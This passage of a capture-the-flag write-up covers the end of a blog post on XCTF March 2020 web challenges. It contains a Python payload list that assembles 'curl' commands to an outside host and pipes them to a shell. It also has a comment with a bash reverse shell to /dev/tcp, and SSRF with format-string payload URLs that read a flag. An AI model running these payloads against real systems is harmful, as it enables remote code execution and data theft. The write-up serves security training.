class="line">payload = [</span><br><span class="line"> <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line"> <span class="comment"># reverse file "v" to file "h", content "ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;h'</span>,</span><br><span class="line">  <span class="comment"># generate "curl p3rh4ps.top&gt;p.php"</span></span><br><span class="line">  <span class="comment">#           curl 47.95.119.220:2333&gt;p.php</span></span><br><span class="line">    <span class="string">'&gt;\;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span class="string">'&gt;p.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="comment">#'&gt;op\\',</span></span><br><span class="line">    <span class="comment">#'&gt;t\\', </span></span><br><span class="line">    <span class="comment">#'&gt;s.\\',</span></span><br><span class="line">    <span class="comment">#'&gt;4p\\',</span></span><br><span class="line">    <span class="comment">#'&gt;rh\\',</span></span><br><span class="line">    <span class="comment">#'&gt;p3\\',</span></span><br><span class="line">    <span class="string">'&gt;33\\'</span>,</span><br><span class="line">    <span class="string">'&gt;23\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0:\\'</span>,</span><br><span class="line">    <span class="string">'&gt;22\\'</span>,</span><br><span class="line">    <span class="string">'&gt;9.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;11\\'</span>,</span><br><span class="line">    <span class="string">'&gt;5.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;9\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;4\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="string">'sh h'</span>,</span><br><span class="line"><span class="comment">#curl 10.188.2.20|bash 弹shell bash -i &gt;&amp; /dev/tcp/192.168.20.151/8080 0&gt;&amp;1</span></span><br><span class="line"><span class="comment">#经队里师傅指正我跑不出来的原因是我脚本的h和g反了 难怪我忘记clear跑</span></span><br><span class="line"><span class="comment">#反而出来了 现在已经改正</span></span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    data = &#123;<span class="string">'url'</span>:<span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,'</span>+base64.b64encode(i.encode()).decode()&#125;</span><br><span class="line">    r = s.post(url3, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">'url'</span>])</span><br><span class="line">    time.sleep(0.3)</span><br></pre></td></tr></table></figure></p>
<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'head'</span>])&amp;&amp;isset(<span class="variable">$_GET</span>[<span class="string">'url'</span>]))&#123; </span><br><span class="line">    <span class="variable">$begin</span> = <span class="string">"The number you want: "</span>; </span><br><span class="line">    extract(<span class="variable">$_GET</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$head</span> == <span class="string">''</span>)&#123; </span><br><span class="line">        die(<span class="string">'Where is your head?'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,<span class="variable">$head</span>))&#123; </span><br><span class="line">        die(<span class="string">'Head can\'</span>t be like this!<span class="string">'); </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    if(preg_match('</span>/<span class="built_in">log</span>/i<span class="string">',$url))&#123; </span></span><br><span class="line"><span class="string">        die('</span>No No No<span class="string">'); </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    if(preg_match('</span>/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i<span class="string">',$url))&#123; </span></span><br><span class="line"><span class="string">        die('</span>Don\<span class="string">'t use strange protocol!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$funcname</span> = <span class="variable">$head</span>.<span class="string">'curl_init'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="variable">$funcname</span>(); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ch</span>)&#123; </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$output</span> = <span class="string">'rua'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">echo</span> sprintf(<span class="variable">$begin</span>.<span class="string">'%d'</span>,<span class="variable">$output</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个小trick  ?head=\&amp;url=<a href="http://127.0.0.1:8080&amp;begin=%1$s" target="_blank" rel="noopener">http://127.0.0.1:8080&amp;begin=%1$s</a><br>一个反斜杠 sprintf函数如果%多于参数，就要使用%1占位符，配合$s输出字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our FMKQ api, you could use the <span class="built_in">help</span> information below</span><br><span class="line">        To <span class="built_in">read</span> file:</span><br><span class="line">            /<span class="built_in">read</span>/file=example&amp;vipcode=example</span><br><span class="line">            <span class="keyword">if</span> you are not vip,<span class="built_in">let</span> vipcode=0,and you can only <span class="built_in">read</span> /tmp/&#123;file&#125;</span><br><span class="line">        Other <span class="built_in">functions</span> only <span class="keyword">for</span> the vip!!!</span><br><span class="line">        0</span><br></pre></td></tr></table></figure></p>
<p>然后开始尝试读文件，发现过滤了.. 不是ssti，是类似ssti的格式化字符串漏洞，附<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">p神博客</a>和<a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">先知上的一篇</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后台类似这样</span><br><span class="line"><span class="built_in">print</span>((<span class="string">"&#123;file.__class__&#125;"</span>+<span class="string">"&#123;file&#125;"</span>).format(file=<span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">?head=\&amp;url=http://127.0.0.1:8080/file=&#123;file.__class__&#125;%26vipcode=0&amp;begin=%1<span class="variable">$s</span></span><br><span class="line">&#123;file.__init__.__globals__&#125;得到vip类</span><br><span class="line">&#123;file.__init__.__globals__[vip].__init__.__globals__&#125;得到vip类的vipcode属性值</span><br></pre></td></tr></table></figure></p>
<p>带上vipcode就可以读文件了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome,dear vip! Here are what you want:</span><br><span class="line">The file you <span class="built_in">read</span> is:</span><br><span class="line">//fl4g_1s_h3re_u_wi11_rua0</span><br><span class="line"></span><br><span class="line">The content is:</span><br><span class="line">can<span class="string">'t read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Other files under the same folder:</span></span><br><span class="line"><span class="string">lib media opt var usr mnt bin root home tmp boot sys run sbin srv lib64 etc dev proc app .dockerenv fl4g_1s_h3re_u_wi11_rua0</span></span><br></pre></td></tr></table></figure></p>
<p>过滤了fl4g，有两种绕过方法 在源码/app/base/vip.py中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class vipreadfile():</span><br><span class="line">    def __init__(self,readfile):</span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        global current_folder_file</span><br><span class="line">        try:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        except:</span><br><span class="line">            current_folder_file = current_folder_file</span><br></pre></td></tr></table></figure></p>
<p>读取/fl4g_1s_h3re_u_wi11_rua/aaa然后读取一个不存在的路径 然后会显示上一次的路径，列出/fl4g_1s_h3re_u_wi11_rua目录下文件，flag<br>其实题目已经提示了flag在 /未知目录/flag current_folder_file这时等于fl4g_1s_h3re_u_wi11_rua 然后还是利用format格式化字符串漏洞拼接路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/<span class="built_in">read</span>/file=/&#123;vipfile.__init__.__globals__[current_folder_file][21]&#125;/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL</span><br><span class="line"></span><br><span class="line">星盟师傅的payload 拼出来个f</span><br><span class="line">http://121.37.179.47:1101/?head=\&amp;begin=%1<span class="variable">$s</span>&amp;url=http://127.0.0.1:8080/<span class="built_in">read</span>/file=&#123;vipfile.__class__.__init__.__globals__[__name__][9]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</span><br></pre></td></tr></table></figure></p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: cop</p><p>Ursprünglicher Link: <a href="http://yoursite.com/2020/03/09/xctf3月赛/">http://yoursite.com/2020/03/09/xctf3月赛/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/03/11/MySQL服务端恶意读取客户端文件漏洞/" class="pre">MySQL服务端恶意读取客户端文件漏洞</a><a href="/2020/03/05/De1CTF-2019刷题记录/" class="next">De1CTF-2019刷题记录</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlcheckin"><span class="toc-text">sqlcheckin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-trick-gzmtu"><span class="toc-text">easy_trick_gzmtu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webtmp"><span class="toc-text">webtmp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-uaf"><span class="toc-text">php-uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hackme"><span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmkq"><span class="toc-text">fmkq</span></a></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/11/MySQL服务端恶意读取客户端文件漏洞/">MySQL服务端恶意读取客户端文件漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/09/xctf3月赛/">xctf3月赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/05/De1CTF-2019刷题记录/">De1CTF-2019刷题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/2.29考核赛/">2.29考核赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/28/RoarCTF 2019/">RoarCTF 2019</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/26/安恒2.26月赛/">安恒2.26月赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/25/从GYCTF的两道题中学习node/">从GYCTF的两道题中学习node</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/24/2020GYCTF/">2020GYCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/15/今日份sql/">今日份sql</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/14/2019安洵杯刷题记录/">2019安洵杯刷题记录</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">19</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>